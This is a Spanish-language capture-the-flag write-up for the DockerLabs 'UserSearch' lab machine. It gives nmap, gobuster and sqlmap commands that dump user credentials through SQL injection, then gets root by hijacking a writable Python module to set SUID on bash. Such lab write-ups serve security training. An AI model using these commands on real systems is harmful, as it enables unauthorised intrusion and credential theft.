---
title: UserSearch - DockerLabs
published: true
categories: DockerLabs
---


| OS    | Dificultad | Creator |
| ----- | ---------- | ------- |
| Linux | Medio      | kvzlx   |


## Escaneo y Reconocimiento de puertos

Vamos a iniciar nuestro reconocimiento con un rápido escaneo de nmap.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/0297f62a-c2bb-43fb-80ae-a718d6d058b5)

`nmap -p- --open -sS -sC -sV --min-rate=5000 -vvv -n -Pn -oN escaneo 172.17.0.2`
-  `-p-`: Escanea todos los puertos (1-65535).
- `--open`: Solo muestra los puertos abiertos.
- `-sS`: Realiza un escaneo SYN, que es rápido y discreto.
- `-sC`: Utiliza los scripts de reconocimiento por defecto de Nmap.
- `-sV`: Detecta la versión del servicio en los puertos abiertos.
- `--min-rate=5000`: Envía al menos 5000 paquetes por segundo, acelerando el escaneo.
- `-n`: No realiza resolución DNS.
- `-Pn`: No realiza ping previo para determinar si el host está activo.
- `-vvv`: Muestra resultados detallados y en tiempo real.

Vemos que esta abierto el puerto 22 `SSH` y el puerto 80 `HTTP`

## Enumeración Web

Si accedemos a la pagina web vemos lo siguiente 

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/a9e9ff81-f698-4e76-9e7d-3400580bbd25)


Usamos `Gobuster` para hacer un reconocimiento web y ver que directorios podemos encontrar en dicho sitio.

`gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php`
- `gobuster dir` - Indica que estás utilizando la herramienta Gobuster para realizar un escaneo de directorios.
- `-u http://172.20.10.5/` Especifica la URL objetivo que deseas escanear en busca de directorios.
- `-w` Especifica que diccionario queremos usar
- `-x` Para indicar que tipo de extension queremos que nos encuentre

Gobuster no ha encontrado nada

Si nos fijamos en el mensaje de unauthorized query me da que pensar que por detras tiene una base de datos así que vamos a ver si podemos ver algo con sqlmap

## Ataque SQLi SQLMap

```
sqlmap -u http://172.19.0.2 --forms --dbs --batch
```

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/dda3a671-d9c9-4efa-b3a9-31ab0c0caac5)


Ahora haremos una consulta de tablas en la base de datos testdb.

```
sqlmap -u http://172.19.0.2 --forms -D testdb --tables --batch
```

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/096612c4-77f5-4628-99a0-f8ce9fc620cf)

Vamos a listar que columnas hay dentro de la tabla users

```
sqlmap -u http://172.19.0.2 --forms -D testdb -T users --columns --batch
```

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/a7a1b019-0472-4422-a35d-53403393c2e6)


Por ultimo vamos a ver que hay dentro de la columna password y username

```
sqlmap -u http://172.19.0.2 --forms -D testdb -T users -C id,password,username --dump --batch
```

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/4e01cc66-526c-400f-a7c5-7d02495d6a46)

Tenemos una serie de usuarios y contraseñas.

## Intrusión a la máquina

Vamos a probar de acceder con el usuario kvzlx y la contraseña que hemos encontrado


![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/f34fb530-8bf6-4f75-a91f-55f5608ccaa0)

Si hacemos un sudo -l vemos lo siguiente

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/48d9aed7-61de-4724-919f-8fb44569a3cf)

## Escalada de privilegios

Vamos hacer un cat del script 

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/ec98009d-76fe-4bb0-8fec-47dd7d90e343)

Vemos varias cosas:

-> Importa el modulo psutil
-> Utiliza virtual_memory() como función

Vamos a pasarle linpeas ya que no encontramos nada


![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/3de9a1d9-e57d-4e29-a2a9-24a6842babb2)

Encontramos esto que es el modulo de psutil y si nos fijamos tenemos permisos de escritura en el init.py

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/38f62f5a-fcfd-4605-907f-a325c0a46488)

Vamos a probar de introducir un código para que nos muestre que usuario esta ejecutando el script de la siguente forma.


![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/f268e77f-4440-4d34-9c9b-5253c01688e4)

Ahora si ejecutamos el script con el binario de python3 nos deberia decir root y luego debería ejecutar el script.


![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/da1702e4-047a-4dbf-b76e-924c5bc429fd)


Genial como esto nos lo ha realizado ya tenemos una via de explotación para la escalada de privilegios

Lo que vamos hacer va ha ser que la bash tenga permiso SUID de la siguiente forma

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/fb9c11cd-daa4-4eaf-ba33-c30c9081d859)

Ahora si ejecutamos el script y posteriormente hacemos bash -p

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/92967f99-631b-4c6e-ac0a-50be3e02f74c)

Ya somos root

